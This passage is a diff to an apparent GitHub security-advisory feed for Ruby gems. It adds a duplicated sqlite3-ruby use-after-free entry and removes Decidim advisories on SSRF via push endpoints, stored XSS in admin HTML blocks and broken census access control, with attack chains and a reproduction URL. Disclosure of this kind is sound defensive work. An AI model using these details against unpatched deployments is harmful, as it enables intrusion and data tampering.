+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619</a></li>
+<li><a href="https://github.com/advisories/GHSA-28hh-pr2h-2w89">https://github.com/advisories/GHSA-28hh-pr2h-2w89</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-28hh-pr2h-2w89</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:21:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3-ruby] sqlite3-ruby has Use-After-Free When Redefining SQLite Functions with Different Arity]]></title>
+        <id>https://github.com/advisories/GHSA-28hh-pr2h-2w89</id>
+        <link href="https://github.com/advisories/GHSA-28hh-pr2h-2w89"/>
+        <updated>2026-07-28T16:21:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_function</code> or <code>Database#define_function</code> to define the same function name more than once with different numbers of arguments ("arity") or text encodings will result in a invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid defining multiple custom functions with the same name (varying numbers of arguments or encoding).</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/710">https://github.com/sparklemotion/sqlite3-ruby/pull/710</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033">https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619</a></li>
+<li><a href="https://github.com/advisories/GHSA-28hh-pr2h-2w89">https://github.com/advisories/GHSA-28hh-pr2h-2w89</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-28hh-pr2h-2w89</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:21:31.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[action_text-trix] Trix: Stored XSS via HTMLParser attribute injection on paste]]></title>
         <id>https://github.com/advisories/GHSA-53g2-mvcc-q9x3</id>
@@ -1016,302 +1510,5 @@ expect(WebPush).to receive(:payload_send).with(first_notification_payload)
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-13T17:19:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-core] Decidim: Push subscriptions can be abused for server-side requests]]></title>
-        <id>https://github.com/advisories/GHSA-2g9c-vf8h-prxx</id>
-        <link href="https://github.com/advisories/GHSA-2g9c-vf8h-prxx"/>
-        <updated>2026-07-13T17:19:20.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>The push-subscription endpoint stores an attacker-controlled delivery URL, and the notification send path becomes an outbound-request sink when VAPID delivery is enabled. The practical result is an authenticated, stored, mostly blind SSRF primitive to arbitrary HTTPS endpoints reachable from the app server.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>When VAPID delivery is enabled, the notification subscription flow stores the client-supplied push endpoint without checking that it belongs to an approved push service. The send path later passes that stored URL to <code>WebPush.payload_send</code>, turning the subscription into an attacker-controlled outbound request destination.
-This is the source-to-sink chain:</p>
-<ol>
-<li>Source: attacker-controlled <code>subscription.endpoint</code> in the JSON body posted to <code>POST /notifications_subscriptions</code>.</li>
-<li>Persistence: <code>params[:endpoint]</code> is stored under <code>user.notification_settings["subscriptions"]</code>.</li>
-<li>Retrieval: <code>user.notifications_subscriptions.values</code> returns that stored endpoint later.</li>
-<li>Sink: <code>build_payload</code> sets <code>endpoint: subscription["endpoint"]</code>.</li>
-<li>Outbound request: <code>WebPush.payload_send(**payload)</code> uses the attacker-supplied endpoint as the
-destination.</li>
-</ol>
-<p>One spec asserts that the endpoint is persisted exactly as supplied:</p>
-<pre><code class="language-ruby"># decidim-core/spec/services/decidim/notifications_subscriptions_persistor_spec.rb
-expect(user.notifications_subscriptions["auth_code_121"]["endpoint"]).to eq(params[:endpoint])
-</code></pre>
-<p>Another spec asserts that <code>SendPushNotification</code> passes the stored endpoint into <code>WebPush.payload_send</code>:</p>
-<pre><code class="language-ruby"># decidim-core/spec/services/decidim/send_push_notification_spec.rb
-first_notification_payload = {
-  message:,
-  endpoint: subscriptions["auth_key_1"]["endpoint"],
-  p256dh: subscriptions["auth_key_1"]["p256dh"],
-  auth: subscriptions["auth_key_1"]["auth"],
-  vapid: a_hash_including(...)
-}
-expect(WebPush).to receive(:payload_send).with(first_notification_payload)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>In a configured deployment, an authenticated user can register an attacker-controlled or otherwise unauthorized HTTPS URL.</li>
-<li>The server then sends outbound <code>POST</code> requests there whenever a notification is pushed.</li>
-<li>This is a stored, mostly blind SSRF primitive: useful for outbound interaction with attacker infrastructure and, where routable, internal HTTPS services.</li>
-<li>Notification metadata is disclosed to the supplied endpoint through the encrypted web push request path.</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16714">https://github.com/decidim/decidim/pull/16714</a>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable the push notifications feature by removing the VAPID keys in the server.</p>
-<h3 id="resource">Resource</h3>
-<p>SSRF</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-2g9c-vf8h-prxx">https://github.com/decidim/decidim/security/advisories/GHSA-2g9c-vf8h-prxx</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16714">https://github.com/decidim/decidim/pull/16714</a></li>
-<li><a href="https://github.com/advisories/GHSA-2g9c-vf8h-prxx">https://github.com/advisories/GHSA-2g9c-vf8h-prxx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2g9c-vf8h-prxx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:19:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-core] Decidim: Push subscriptions can be abused for server-side requests]]></title>
-        <id>https://github.com/advisories/GHSA-2g9c-vf8h-prxx</id>
-        <link href="https://github.com/advisories/GHSA-2g9c-vf8h-prxx"/>
-        <updated>2026-07-13T17:19:20.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>The push-subscription endpoint stores an attacker-controlled delivery URL, and the notification send path becomes an outbound-request sink when VAPID delivery is enabled. The practical result is an authenticated, stored, mostly blind SSRF primitive to arbitrary HTTPS endpoints reachable from the app server.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>When VAPID delivery is enabled, the notification subscription flow stores the client-supplied push endpoint without checking that it belongs to an approved push service. The send path later passes that stored URL to <code>WebPush.payload_send</code>, turning the subscription into an attacker-controlled outbound request destination.
-This is the source-to-sink chain:</p>
-<ol>
-<li>Source: attacker-controlled <code>subscription.endpoint</code> in the JSON body posted to <code>POST /notifications_subscriptions</code>.</li>
-<li>Persistence: <code>params[:endpoint]</code> is stored under <code>user.notification_settings["subscriptions"]</code>.</li>
-<li>Retrieval: <code>user.notifications_subscriptions.values</code> returns that stored endpoint later.</li>
-<li>Sink: <code>build_payload</code> sets <code>endpoint: subscription["endpoint"]</code>.</li>
-<li>Outbound request: <code>WebPush.payload_send(**payload)</code> uses the attacker-supplied endpoint as the
-destination.</li>
-</ol>
-<p>One spec asserts that the endpoint is persisted exactly as supplied:</p>
-<pre><code class="language-ruby"># decidim-core/spec/services/decidim/notifications_subscriptions_persistor_spec.rb
-expect(user.notifications_subscriptions["auth_code_121"]["endpoint"]).to eq(params[:endpoint])
-</code></pre>
-<p>Another spec asserts that <code>SendPushNotification</code> passes the stored endpoint into <code>WebPush.payload_send</code>:</p>
-<pre><code class="language-ruby"># decidim-core/spec/services/decidim/send_push_notification_spec.rb
-first_notification_payload = {
-  message:,
-  endpoint: subscriptions["auth_key_1"]["endpoint"],
-  p256dh: subscriptions["auth_key_1"]["p256dh"],
-  auth: subscriptions["auth_key_1"]["auth"],
-  vapid: a_hash_including(...)
-}
-expect(WebPush).to receive(:payload_send).with(first_notification_payload)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>In a configured deployment, an authenticated user can register an attacker-controlled or otherwise unauthorized HTTPS URL.</li>
-<li>The server then sends outbound <code>POST</code> requests there whenever a notification is pushed.</li>
-<li>This is a stored, mostly blind SSRF primitive: useful for outbound interaction with attacker infrastructure and, where routable, internal HTTPS services.</li>
-<li>Notification metadata is disclosed to the supplied endpoint through the encrypted web push request path.</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16714">https://github.com/decidim/decidim/pull/16714</a>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable the push notifications feature by removing the VAPID keys in the server.</p>
-<h3 id="resource">Resource</h3>
-<p>SSRF</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-2g9c-vf8h-prxx">https://github.com/decidim/decidim/security/advisories/GHSA-2g9c-vf8h-prxx</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16714">https://github.com/decidim/decidim/pull/16714</a></li>
-<li><a href="https://github.com/advisories/GHSA-2g9c-vf8h-prxx">https://github.com/advisories/GHSA-2g9c-vf8h-prxx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2g9c-vf8h-prxx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:19:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-core] Decidim: HTML content blocks allow stored script execution]]></title>
-        <id>https://github.com/advisories/GHSA-533c-2vh9-4r86</id>
-        <link href="https://github.com/advisories/GHSA-533c-2vh9-4r86"/>
-        <updated>2026-07-13T17:18:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>A privileged admin user who can edit an affected landing page can store arbitrary HTML/JavaScript in an <code>HTML block</code>, and the public page renders it with <code>html_safe</code> and no output escaping.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>This issue lets any admin who can edit an affected landing page store arbitrary HTML and JavaScript in an <code>HTML block</code>. The block is then rendered back through <code>Decidim::ContentBlocks::HtmlCell#html_content</code> without a sanitization boundary, so the script executes later in visitor's browsers.</p>
-<img width="1541" height="439" alt="decidim-html-xss-01" src="https://github.com/user-attachments/assets/acae1c06-8acb-49be-ab12-aabae33190ce">
-
-<img width="1540" height="752" alt="decidim-html-xss-02" src="https://github.com/user-attachments/assets/a2f1fa7f-03f3-4d17-b58b-f4db865443e9">
-
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>A user with landing-page editing rights for an affected scope can persist JavaScript that executes in visitor's browsers on that page.</li>
-<li>Because exploitation already requires privileged administrative access, the practical risk is lower than a participant-controlled or unauthenticated stored XSS. It still creates a browser-execution primitive in a trusted admin-editable surface.</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a> </p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not give admin permissions to non-trustful users. </p>
-<h3 id="reference">Reference</h3>
-<p>Stored XSS</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86">https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a></li>
-<li><a href="https://github.com/advisories/GHSA-533c-2vh9-4r86">https://github.com/advisories/GHSA-533c-2vh9-4r86</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-533c-2vh9-4r86</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:18:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-core] Decidim: HTML content blocks allow stored script execution]]></title>
-        <id>https://github.com/advisories/GHSA-533c-2vh9-4r86</id>
-        <link href="https://github.com/advisories/GHSA-533c-2vh9-4r86"/>
-        <updated>2026-07-13T17:18:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>A privileged admin user who can edit an affected landing page can store arbitrary HTML/JavaScript in an <code>HTML block</code>, and the public page renders it with <code>html_safe</code> and no output escaping.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>This issue lets any admin who can edit an affected landing page store arbitrary HTML and JavaScript in an <code>HTML block</code>. The block is then rendered back through <code>Decidim::ContentBlocks::HtmlCell#html_content</code> without a sanitization boundary, so the script executes later in visitor's browsers.</p>
-<img width="1541" height="439" alt="decidim-html-xss-01" src="https://github.com/user-attachments/assets/acae1c06-8acb-49be-ab12-aabae33190ce">
-
-<img width="1540" height="752" alt="decidim-html-xss-02" src="https://github.com/user-attachments/assets/a2f1fa7f-03f3-4d17-b58b-f4db865443e9">
-
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>A user with landing-page editing rights for an affected scope can persist JavaScript that executes in visitor's browsers on that page.</li>
-<li>Because exploitation already requires privileged administrative access, the practical risk is lower than a participant-controlled or unauthenticated stored XSS. It still creates a browser-execution primitive in a trusted admin-editable surface.</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a> </p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not give admin permissions to non-trustful users. </p>
-<h3 id="reference">Reference</h3>
-<p>Stored XSS</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86">https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a></li>
-<li><a href="https://github.com/advisories/GHSA-533c-2vh9-4r86">https://github.com/advisories/GHSA-533c-2vh9-4r86</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-533c-2vh9-4r86</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:18:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-core] Decidim: HTML content blocks allow stored script execution]]></title>
-        <id>https://github.com/advisories/GHSA-533c-2vh9-4r86</id>
-        <link href="https://github.com/advisories/GHSA-533c-2vh9-4r86"/>
-        <updated>2026-07-13T17:18:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>A privileged admin user who can edit an affected landing page can store arbitrary HTML/JavaScript in an <code>HTML block</code>, and the public page renders it with <code>html_safe</code> and no output escaping.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>This issue lets any admin who can edit an affected landing page store arbitrary HTML and JavaScript in an <code>HTML block</code>. The block is then rendered back through <code>Decidim::ContentBlocks::HtmlCell#html_content</code> without a sanitization boundary, so the script executes later in visitor's browsers.</p>
-<img width="1541" height="439" alt="decidim-html-xss-01" src="https://github.com/user-attachments/assets/acae1c06-8acb-49be-ab12-aabae33190ce">
-
-<img width="1540" height="752" alt="decidim-html-xss-02" src="https://github.com/user-attachments/assets/a2f1fa7f-03f3-4d17-b58b-f4db865443e9">
-
-
-<h3 id="impact">Impact</h3>
-<ul>
-<li>A user with landing-page editing rights for an affected scope can persist JavaScript that executes in visitor's browsers on that page.</li>
-<li>Because exploitation already requires privileged administrative access, the practical risk is lower than a participant-controlled or unauthenticated stored XSS. It still creates a browser-execution primitive in a trusted admin-editable surface.</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a> </p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not give admin permissions to non-trustful users. </p>
-<h3 id="reference">Reference</h3>
-<p>Stored XSS</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86">https://github.com/decidim/decidim/security/advisories/GHSA-533c-2vh9-4r86</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16451">https://github.com/decidim/decidim/pull/16451</a></li>
-<li><a href="https://github.com/advisories/GHSA-533c-2vh9-4r86">https://github.com/advisories/GHSA-533c-2vh9-4r86</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-533c-2vh9-4r86</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:18:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[decidim-verifications] Decidim: CSV census record endpoints improper authorization]]></title>
-        <id>https://github.com/advisories/GHSA-q79h-67vx-m9xg</id>
-        <link href="https://github.com/advisories/GHSA-q79h-67vx-m9xg"/>
-        <updated>2026-07-13T17:17:34.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>A participant manager can access and modify the CSV census record admin forms.</p>
-<h2 id="technical-description">Technical description</h2>
-<p>The CSV census admin record-management surface under <code>/admin/csv_census/census_logs</code> does not enforce admin-only authorization before rendering or mutating <code>Decidim::Verifications::CsvDatum</code>.</p>
-<p>A participant manager (which can only manage participants) can therefore open the admin forms, create or update census rows, and delete rows directly.</p>
-<p>Reproduction steps:</p>
-<ol>
-<li>Sign in a participant admin and open <code>http://localhost:3000/admin/csv_census/census_logs/new_record</code> in the browser. Confirm the create form loads even though the session is not a full admin.</li>
-</ol>
-<img width="1541" height="274" alt="decidim-census-01" src="https://github.com/user-attachments/assets/859ee101-746f-4acb-8051-27036689f1b3">
-
-<img width="1538" height="363" alt="decidim-census-02" src="https://github.com/user-attachments/assets/85bbb004-a999-46dc-856c-fd32b50ced2c">
-
-<p>Note that normal participant accounts were not able to access the CSV census records which is good.</p>
-<h3 id="impact">Impact</h3>
-<p>Any participant admin can create, alter, or remove CSV census rows, which can corrupt verification data relied on by authorization workflows.</p>
-<h3 id="patches">Patches</h3>
-<p>See <a href="https://github.com/decidim/decidim/pull/16674">https://github.com/decidim/decidim/pull/16674</a> and <a href="https://github.com/decidim/decidim/pull/16703">https://github.com/decidim/decidim/pull/16703</a> </p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable Organization Census verification method</p>
-<h3 id="reference">Reference</h3>
-<p>OWASP A01:2021 Broken Access Control</p>
-<h3 id="credits">Credits</h3>
-<p>This issue was discovered in a security audit organized by the <a href="https://decidim.org">Decidim Association</a> and made by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a> against Decidim financed by <a href="https://ngi.eu/">NGI</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-q79h-67vx-m9xg">https://github.com/decidim/decidim/security/advisories/GHSA-q79h-67vx-m9xg</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16674">https://github.com/decidim/decidim/pull/16674</a></li>
-<li><a href="https://github.com/decidim/decidim/pull/16703">https://github.com/decidim/decidim/pull/16703</a></li>
-<li><a href="https://github.com/advisories/GHSA-q79h-67vx-m9xg">https://github.com/advisories/GHSA-q79h-67vx-m9xg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q79h-67vx-m9xg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-13T17:17:33.000Z</published>
     </entry>
 </feed>
